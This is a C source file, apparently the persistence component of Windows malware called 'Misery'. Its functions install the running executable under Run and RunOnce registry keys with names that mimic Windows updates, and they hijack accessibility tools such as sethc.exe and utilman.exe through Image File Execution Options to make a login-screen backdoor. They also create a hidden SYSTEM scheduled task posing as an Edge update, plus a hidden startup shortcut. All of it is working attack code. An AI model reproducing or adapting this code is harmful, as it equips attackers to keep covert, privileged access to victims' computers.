#include "persistence.h"
#include "misery_config.h"
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static int g_persistence_last_error = 0;

bool PersistenceInstallRegistry(void) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    HKEY hk = NULL;
    DWORD dwDisp;

    MiseryLog(MISERY_LOG_INFO, "PersistenceInstallRegistry: Installing registry persistence");

    /* 1. HKCU Run */
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "WindowsSecurityUpdate", 0, REG_SZ,
                       (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hk);
        MiseryLog(MISERY_LOG_INFO, "PersistenceInstallRegistry: HKCU Run installed");
    }

    /* 2. HKLM Run */
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hk, &dwDisp) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "WindowsSecurityUpdate", 0, REG_SZ,
                       (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hk);
        MiseryLog(MISERY_LOG_INFO, "PersistenceInstallRegistry: HKLM Run installed");
    }

    /* 3. HKCU RunOnce */
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "WindowsUpdateCheck", 0, REG_SZ,
                       (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hk);
        MiseryLog(MISERY_LOG_INFO, "PersistenceInstallRegistry: RunOnce installed");
    }

    return true;
}

bool PersistenceInstallAccessibilityBackdoor(void) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    const char *accessTools[] = {
        "sethc.exe",
        "magnify.exe",
        "narrator.exe",
        "osk.exe",
        "utilman.exe",
        "displayswitch.exe",
        "atbroker.exe",
        NULL
    };

    MiseryLog(MISERY_LOG_INFO, "PersistenceInstallAccessibilityBackdoor: Installing accessibility backdoors");

    for (int i = 0; accessTools[i]; i++) {
        char regPath[MAX_PATH];
        snprintf(regPath, sizeof(regPath),
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
            accessTools[i]);

        HKEY hk = NULL;
        DWORD dwDisp;
        if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0,
                            KEY_SET_VALUE, NULL, &hk, &dwDisp) == ERROR_SUCCESS) {
            RegSetValueExA(hk, "Debugger", 0, REG_SZ,
                           (BYTE*)exePath, strlen(exePath) + 1);
            RegCloseKey(hk);
            MiseryLog(MISERY_LOG_INFO, "PersistenceInstallAccessibilityBackdoor: Patched [%s]", accessTools[i]);
        }
    }

    return true;
}

bool PersistenceInstallScheduledTask(void) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    MiseryLog(MISERY_LOG_INFO, "PersistenceInstallScheduledTask: Creating scheduled task");

    char taskCmd[2048];
    snprintf(taskCmd, sizeof(taskCmd),
        "schtasks /create /f /tn \"MicrosoftEdgeUpdateTask\" "
        "/tr \"%s\" /sc ONLOGON /ru SYSTEM /rl HIGHEST", exePath);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    
    if (CreateProcessA(NULL, taskCmd, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        MiseryLog(MISERY_LOG_INFO, "PersistenceInstallScheduledTask: Scheduled task created");
    } else {
        g_persistence_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "PersistenceInstallScheduledTask: Failed to create task (err: %d)", g_persistence_last_error);
    }

    return true;
}

bool PersistenceInstallStartupFolder(void) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    char startupPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) != S_OK) {
        MiseryLog(MISERY_LOG_WARN, "PersistenceInstallStartupFolder: Failed to get startup folder");
        return false;
    }

    char linkPath[MAX_PATH * 2];
    snprintf(linkPath, sizeof(linkPath), "%s\\WindowsServiceHost.lnk", startupPath);

    char psCmd[4096];
    snprintf(psCmd, sizeof(psCmd),
        "powershell -Command \"$WS = New-Object -ComObject WScript.Shell; "
        "$SC = $WS.CreateShortcut('%s'); $SC.TargetPath = '%s'; "
        "$SC.WindowStyle = 0; $SC.Description = 'Windows Service Host'; "
        "$SC.Save()\"", linkPath, exePath);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    
    if (CreateProcessA(NULL, psCmd, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        MiseryLog(MISERY_LOG_INFO, "PersistenceInstallStartupFolder: Startup shortcut created");
    } else {
        g_persistence_last_error = GetLastError();
        MiseryLog(MISERY_LOG_WARN, "PersistenceInstallStartupFolder: Failed (err: %d)", g_persistence_last_error);
    }

    return true;
}

bool PersistenceInstallAll(void) {
    MiseryLog(MISERY_LOG_INFO, "PersistenceInstallAll: Installing all persistence mechanisms");
    
    bool success = true;
    success &= PersistenceInstallRegistry();
    success &= PersistenceInstallAccessibilityBackdoor();
    success &= PersistenceInstallScheduledTask();
    success &= PersistenceInstallStartupFolder();
    
    MiseryLog(MISERY_LOG_INFO, "PersistenceInstallAll: Persistence installation %s",
        success ? "COMPLETE" : "PARTIAL");
    
    return success;
}
